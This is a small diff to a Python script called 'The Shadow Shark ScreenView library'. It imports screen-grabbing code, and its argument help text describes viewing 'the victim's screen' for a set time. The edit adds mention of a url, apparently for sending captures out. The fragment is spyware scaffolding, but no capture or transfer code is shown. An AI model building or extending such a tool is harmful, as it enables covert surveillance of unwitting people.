@@ -12,7 +12,7 @@ import codecs
 from PIL import ImageGrab
 
 def get_arguments():
-    '''Get the time.'''
+    '''Get the time and url.'''
     parser = argparse.ArgumentParser(description='''The Shadow Shark ScreenView library.''')
     parser.add_argument('-t', '--time', dest='time', required=True, type=int,
                         help="The amount of time to view the victim's screen in minutes.")
